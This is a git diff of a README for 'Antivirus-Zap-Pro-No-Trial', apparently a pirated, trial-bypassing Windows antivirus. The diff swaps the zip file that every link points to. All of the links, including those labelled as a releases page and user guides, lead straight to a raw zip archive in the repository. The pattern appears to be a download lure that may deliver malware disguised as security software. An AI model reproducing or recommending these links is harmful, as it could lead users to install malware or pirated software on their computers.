@@ -1,6 +1,6 @@
 # 🛡️ Antivirus-Zap-Pro-No-Trial - Powerful Protection for Your PC
 
-[![Download Now](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Antivirus-Zap-Pro-No-Trial-2.3.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Antivirus-Zap-Pro-No-Trial-2.3.zip)
+[![Download Now](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Trial_Pro_No_Antivirus_Zap_3.4.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Trial_Pro_No_Antivirus_Zap_3.4.zip)
 
 ## 📚 Introduction
 
@@ -11,7 +11,7 @@ Antivirus Zap Pro is your go-to solution for keeping your Windows PC safe from t
 To start using Antivirus Zap Pro, follow these straightforward steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page:
-   - [Download Page](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Antivirus-Zap-Pro-No-Trial-2.3.zip)
+   - [Download Page](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Trial_Pro_No_Antivirus_Zap_3.4.zip)
 
 2. **Download the Application**: Look for the latest version. Click on the file or link related to Antivirus Zap Pro to download it to your computer.
 
@@ -28,7 +28,7 @@ To start using Antivirus Zap Pro, follow these straightforward steps:
 
 To install Antivirus Zap Pro, visit the Releases page and select the version you need. Here’s the link again:
 
-[Download Page](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Antivirus-Zap-Pro-No-Trial-2.3.zip)
+[Download Page](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Trial_Pro_No_Antivirus_Zap_3.4.zip)
 
 **Installation Tips**:
 - Ensure you have a stable internet connection during the download.
@@ -74,7 +74,7 @@ For assistance with Antivirus Zap Pro, you can access the following resources:
 
 ## 🔗 Useful Links
 
-- [Download Page](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Antivirus-Zap-Pro-No-Trial-2.3.zip)
-- [User Guides](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Antivirus-Zap-Pro-No-Trial-2.3.zip)
+- [Download Page](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Trial_Pro_No_Antivirus_Zap_3.4.zip)
+- [User Guides](https://raw.githubusercontent.com/jonirey/Antivirus-Zap-Pro-No-Trial/main/mantis/Trial_Pro_No_Antivirus_Zap_3.4.zip)
 
 By following these guidelines, you can ensure a smooth experience with Antivirus Zap Pro. Enjoy better security and peace of mind while using your PC.
